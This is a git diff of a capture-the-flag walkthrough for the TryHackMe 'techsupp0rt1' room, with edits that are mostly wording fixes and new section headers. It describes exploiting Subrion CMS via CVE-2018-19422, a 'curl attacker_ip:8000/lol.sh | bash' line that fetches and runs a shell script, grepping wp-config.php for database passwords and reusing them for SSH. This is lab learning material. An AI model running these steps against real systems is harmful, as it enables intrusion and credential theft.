@@ -1,4 +1,5 @@
-# Room: [techsupp0rt1](https://tryhackme.com/room/techsupp0rt1) (*Hack into the scammer's under-development website to foil their plans.*)
+# Room: [techsupp0rt1](https://tryhackme.com/room/techsupp0rt1)
+(*Hack into the scammer's under-development website to foil their plans.*)
 
 
 ## Basic Enum
@@ -46,7 +47,7 @@ getting file \enter.txt of size 273 as enter.txt (1.9 KiloBytes/sec) (average 1.
 
 ```
 
-It gaves quite juicy info:
+It shows some juicy info:
 
 ```bash
 cat enter.txt      
@@ -64,9 +65,9 @@ Wordpress creds
 |->
 
 ```
-- Ok so the magical formula was pretty easy thanks to https://gchq.github.io/CyberChef/ I was able to get the admin pass in plaintext!
-- So what am I looking for :D probably a way to escalte on Subrion CMS security breach.
-- He took me a while to figure out where the panel exactly was, as I was blindly folllwing my gobuster/feroxbuster/dirb results 
+- The "magical formula" was easy to find thanks to the awesome tool https://gchq.github.io/CyberChef/ !
+- So what am I looking for now ? :D probably a way to escalte on Subrion CMS security breach.
+- It took me a while to figure out where the panel exactly was, as I was blindly following my gobuster/feroxbuster/dirb whatever results 
 
 <details>
   <summary>Click to reveal the admin pass!</summary>
@@ -76,7 +77,7 @@ Wordpress creds
   ```
 </details>
 
-However the following IP trick me while I was looking for the redirect though:
+However the following IP `10.0.2.15` trick me while I was looking for the redirect though:
 
 ```bash
 curl -IXGET http://techsupp0rt1/subrion -L
@@ -125,8 +126,9 @@ Vary: Accept-Encoding
 Content-Length: 6203
 Content-Type: text/html;charset=UTF-8
 ```
+## Exploiting CVE-2018-19422
 
-So let's have fun thanks to https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE 
+So I was able to have fun thanks to https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE 
 
 ```bash
 $ pwd
@@ -140,7 +142,9 @@ drwxr-xr-x  4 scamsite scamsite 4.0K May 29  2021 scamsite
 
 ```
 
-So I found the scamsite user home however as I crashed the shell while trying to stabilize it I decided to upload and running it from the victim machine like so :
+## Stabilizing our shell
+
+I noticed the **scamsite** user home however as I crashed the shell while trying to stabilize it I decided to upload and running it from the victim machine like so :
 
 on attacker machine:
 ```bash
@@ -155,7 +159,7 @@ on victim machine:
 curl attacker_ip:8000/lol.sh | bash
 ```
 
-Ok so after stabilizing it I was able to start investagting in a more "convenient" way:
+And after stabilizing it I was able to start investagting in a more "convenient" way:
 
 ```bash
 /var/www/html/wordpress$ grep -iE 'user|pass' wp-con*
@@ -166,6 +170,7 @@ wp-config.php:define( 'DB_PASSWORD', 'Im{REDACTED}3!' );
 wp-config.php: * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 
 ```
+> The support user was also the one we discovered while quiclky brownsing the wordpress site.
 
 <details>
   <summary>Click to reveal the DB password!</summary>
@@ -175,12 +180,10 @@ wp-config.php: * You can change these at any point in time to invalidate all exi
   ```
 </details>
 
-> The support user was also the one we discovered while quiclky brownsing the wordpress site.
+## Privesc
 
-## Basic connection
-
-I used this password with the scamsite username and...it works !
-So I did the following steps to get the root flag:
+I used this password with the scamsite username and...it works ! (FYI:It also worked with the **support** user to connect trhough wordpress admin panel)
+So I did the few following steps to get the root flag:
 
 ```bash
 ssh scamsite@$IP
